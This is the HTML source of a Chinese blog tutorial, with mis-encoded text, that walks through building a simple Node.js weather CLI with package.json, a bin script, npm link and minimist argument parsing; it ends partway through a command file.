  &lt;li&gt;&lt;a href=&quot;#2-å‰æ&quot; id=&quot;markdown-toc-2-å‰æ&quot;&gt;2. å‰æ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-hello-world&quot; id=&quot;markdown-toc-3-hello-world&quot;&gt;3. Hello World&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#3-1-åˆ›å»ºå·¥ç¨‹åŸºæœ¬ç»“æ„&quot; id=&quot;markdown-toc-3-1-åˆ›å»ºå·¥ç¨‹åŸºæœ¬ç»“æ„&quot;&gt;3. 1 åˆ›å»ºå·¥ç¨‹åŸºæœ¬ç»“æ„&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#32-åˆ›å»ºä¸€ä¸ªbinæ–‡ä»¶&quot; id=&quot;markdown-toc-32-åˆ›å»ºä¸€ä¸ªbinæ–‡ä»¶&quot;&gt;3.2 åˆ›å»ºä¸€ä¸ªBinæ–‡ä»¶&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-æ°”æ¸©åº”ç”¨&quot; id=&quot;markdown-toc-4-æ°”æ¸©åº”ç”¨&quot;&gt;4. æ°”æ¸©åº”ç”¨&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#41-å‘½ä»¤è¡Œå‚æ•°&quot; id=&quot;markdown-toc-41-å‘½ä»¤è¡Œå‚æ•°&quot;&gt;4.1 å‘½ä»¤è¡Œå‚æ•°&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#42-è¿è¡Œå‘½ä»¤&quot; id=&quot;markdown-toc-42-è¿è¡Œå‘½ä»¤&quot;&gt;4.2 è¿è¡Œå‘½ä»¤&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#43-é¢„æœŸä¸å®¹é”™&quot; id=&quot;markdown-toc-43-é¢„æœŸä¸å®¹é”™&quot;&gt;4.3 é¢„æœŸä¸å®¹é”™&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#44-è¿›åº¦ä¸è¯·æ±‚&quot; id=&quot;markdown-toc-44-è¿›åº¦ä¸è¯·æ±‚&quot;&gt;4.4 è¿›åº¦ä¸è¯·æ±‚&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#45-é”™è¯¯ä¸é€€å‡ºç &quot; id=&quot;markdown-toc-45-é”™è¯¯ä¸é€€å‡ºç &quot;&gt;4.5 é”™è¯¯ä¸é€€å‡ºç &lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-å‘å¸ƒåˆ°npmä»“åº“&quot; id=&quot;markdown-toc-5-å‘å¸ƒåˆ°npmä»“åº“&quot;&gt;5. å‘å¸ƒåˆ°NPMä»“åº“&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-èƒŒæ™¯&quot;&gt;1. èƒŒæ™¯&lt;/h2&gt;

&lt;p&gt;å½“ä¸‹ javascript å¤§è¡Œå…¶é“ï¼Œæ— è®ºä»ä¼ ç»Ÿwebã€æ‰‹æœºç«¯è¿˜æ˜¯æ¡Œé¢ç¨‹åºï¼Œjavacsript æ— æ‰€ä¸èƒ½ã€‚ES6 çš„å®šä¹‰ ä»¥åŠ nodejs å¤§å¤§æ¨åŠ¨äº† javascript çš„å‘å±•ã€‚è€Œå¤§éƒ¨åˆ†çš„åº”ç”¨éƒ½ç¦»ä¸å¼€ &lt;strong&gt;npm&lt;/strong&gt;ï¼Œå¾ˆå¤šåº”ç”¨éƒ½ä½¿ç”¨ nodejs cli çš„æ–¹å¼è¿›è¡Œåˆå§‹åŒ–ç­‰æ“ä½œã€‚&lt;/p&gt;

&lt;p&gt;æœ¬ç¯‡æ–‡ç« å°†åˆ›å»ºä¸€ä¸ªç®€å•çš„ &lt;strong&gt;nodejs cli&lt;/strong&gt; çš„æ°”æ¸©åº”ç”¨ï¼Œä»¥ä¾¿ç†Ÿæ‚‰å¦‚ä½•è‡ªå·±åˆ›å»º &lt;strong&gt;cli&lt;/strong&gt; å‘½ä»¤è¡Œç¨‹åºã€‚&lt;/p&gt;

&lt;h2 id=&quot;2-å‰æ&quot;&gt;2. å‰æ&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;å®‰è£…å¥½ nodejs ç¯å¢ƒ&lt;/li&gt;
  &lt;li&gt;å…·æœ‰ javascript ç¼–ç¨‹ç»éªŒï¼Œæœ€å¥½ç†Ÿæ‚‰ ES5 æˆ–è€… ES6 çš„è§„èŒƒ&lt;/li&gt;
  &lt;li&gt;å¥½çš„ç¼–è¾‘å™¨ï¼Œæ¯”å¦‚ visual code åè€… sublime&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;3-hello-world&quot;&gt;3. Hello World&lt;/h2&gt;

&lt;h3 id=&quot;3-1-åˆ›å»ºå·¥ç¨‹åŸºæœ¬ç»“æ„&quot;&gt;3. 1 åˆ›å»ºå·¥ç¨‹åŸºæœ¬ç»“æ„&lt;/h3&gt;

&lt;p&gt;å’Œå¾ˆå¤š javascript å·¥ç¨‹ä¸€æ ·ï¼Œéœ€è¦ä¸€ä¸ª &lt;code class=&quot;highlighter-rouge&quot;&gt;package.json&lt;/code&gt; æ–‡ä»¶ä»¥åŠä¸€ä¸ªå…¥å£çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;index.js&lt;/code&gt; æ–‡ä»¶ï¼Œè¿™é‡Œå¼ºè°ƒç®€å•çš„åº”ç”¨ï¼Œæ‰€ä»¥å°½é‡ä¸åšè¿‡å¤šä¾èµ–åº“ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[package.json]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MIT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Welcome to the weather app!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;32-åˆ›å»ºä¸€ä¸ªbinæ–‡ä»¶&quot;&gt;3.2 åˆ›å»ºä¸€ä¸ªBinæ–‡ä»¶&lt;/h3&gt;

&lt;p&gt;æˆ‘ä»¬éœ€è¦ä¸€ç§æ–¹æ³•æ¥è°ƒç”¨æ–°å¼€å‘çš„ javascript ç¨‹åºå¹¶æ˜¾ç¤ºæ¬¢è¿ä¿¡æ¯ï¼Œå¹¶å°†å…¶åŠ å…¥åˆ°ç³»ç»Ÿè·¯å¾„ä¸­ï¼Œä»¥ä¾¿åœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥è°ƒç”¨å®ƒï¼Œbin æ–‡ä»¶æ˜¯å®ç°æ­¤ç›®çš„çš„å¥½æ–¹æ³•ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[bin/weather]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env node&lt;/span&gt;
require&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä½¿ç”¨ bin æ–‡ä»¶è¿è¡Œç¨‹åºï¼Œä½¿ç”¨å‘½ä»¤ &lt;code class=&quot;highlighter-rouge&quot;&gt;cd bin&lt;/code&gt; è¿›å…¥binç›®å½•ï¼Œå¹¶ç»™ &lt;strong&gt;weather&lt;/strong&gt; æ–‡ä»¶èµ‹äºˆæ‰§è¡Œæƒé™ &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod u+x ./weather&lt;/code&gt;ï¼Œç›´æ¥æ‰§è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;./weather&lt;/code&gt; å°±å¯ä»¥æ˜¾ç¤ºæ¬¢è¿ä¿¡æ¯ã€‚&lt;/p&gt;

&lt;p&gt;ä½†è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä»»ä½•è·¯å¾„ä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ npm å…¨å±€å®‰è£…çš„æ–¹å¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install -g weather&lt;/code&gt;ï¼Œæ‰€ä»¥éœ€è¦å°† bin æ–‡ä»¶é…ç½®åˆ° package.json ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[package.json]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MIT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bin/weather&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¢åŠ å¥½ä¹‹åï¼Œåœ¨å·¥ç¨‹æ ¹è·¯å¾„ä¸‹æ‰§è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;npm link&lt;/code&gt; å‘½ä»¤ä¼šå°†äºŒè¿›åˆ¶æ–‡ä»¶ç¬¦å·é“¾æ¥åˆ°ç³»ç»Ÿè·¯å¾„ï¼Œä½¿å…¶å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹é€šè¿‡åœ¨å¤–éƒ¨è¿è¡Œè®¿é—®ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;æ­¤æ—¶ä½ å¯ä»¥åœ¨ä»»ä½•è·¯å¾„ä¸‹éƒ½å¯ä»¥æ‰§è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;weaher&lt;/code&gt; å‘½ä»¤äº†ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;åˆ°æ­¤ä¸ºæ­¢çš„å·¥ç¨‹ç»“æ„ä¸ºï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;weather-cli/
	|- package.json
	|- index.js
	|- bin
		|- weather
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;4-æ°”æ¸©åº”ç”¨&quot;&gt;4. æ°”æ¸©åº”ç”¨&lt;/h2&gt;

&lt;h3 id=&quot;41-å‘½ä»¤è¡Œå‚æ•°&quot;&gt;4.1 å‘½ä»¤è¡Œå‚æ•°&lt;/h3&gt;

&lt;p&gt;å¦‚ä½•å¤„ç†æ¥å—çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œè¿™é‡Œä½¿ç”¨ &lt;strong&gt;&lt;a href=&quot;https://github.com/substack/minimist&quot;&gt;minimist&lt;/a&gt;&lt;/strong&gt; çš„è§£æåº“ï¼Œåœ¨æ ¹è·¯å¾„ä¸‹ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install --save minimist&lt;/code&gt; è¿›è¡Œå®‰è£…&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'minimist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// slice(2) åˆ é™¤å‰ä¸¤ä¸ªå‚æ•°ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è§£é‡Šå™¨ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡ä»¶å&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç°åœ¨è¿è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;weather today --location &quot;NanJing, ZH&quot;&lt;/code&gt;ï¼Œå®ƒå°†ä¼šè¾“å‡º &lt;code class=&quot;highlighter-rouge&quot;&gt;{ _: [ 'today' ], location: 'NanJing, ZH' } &lt;/code&gt;ï¼Œä»è¾“å‡ºç»“æœå¯ä»¥å¾—çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¸…æ™°çš„ json ç»“æ„ï¼Œåˆ°æ­¤æˆ‘ä»¬å»ºç«‹äº†ç¬¬ä¸€ä¸ªè§£æå‘½ä»¤è¡Œå‚æ•°çš„ cli ç¨‹åºã€‚&lt;/p&gt;

&lt;h3 id=&quot;42-è¿è¡Œå‘½ä»¤&quot;&gt;4.2 è¿è¡Œå‘½ä»¤&lt;/h3&gt;

&lt;p&gt;å°†æ¯ä¸ªå‘½ä»¤ä»£ç åˆ†éš”åˆ°ä¸åŒæ–‡ä»¶ä¸­ï¼Œéœ€è¦çš„æ—¶å€™è¿›è¡ŒåŠ è½½ã€‚è¿™ä¼šé˜²æ­¢åŠ è½½ä¸å¿…è¦çš„æ¨¡å—å¹¶å‡å°‘å¯åŠ¨ç¨‹åºçš„æ—¶é—´ï¼Œåœ¨è¿™ç§è®¾ç½®ä¸‹ï¼Œæ¯ä¸ªå‘½ä»¤æ–‡ä»¶éƒ½åº”è¯¥å¯¼å‡ºä¸€ä¸ªå‡½æ•°ï¼Œå¹¶å°†å‚æ•°ä¼ é€’ç»™å®ƒã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'minimist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// slice(2) åˆ é™¤å‰ä¸¤ä¸ªå‚æ•°ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è§£é‡Šå™¨ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡ä»¶å&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// args = { _: [ 'today' ], location: 'NanJing, ZH' }&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// å–ç¬¬ä¸€ä¸ªå‘½ä»¤&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'today'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// éœ€è¦çš„æ—¶å€™åŠ è½½è¿è¡Œå¹¶æŠŠå‚æ•°è¿›è¡Œä¼ é€’&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./cmds/today'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nl&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; is not a valid command!`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[cmds/today.js]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'today is sunny'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
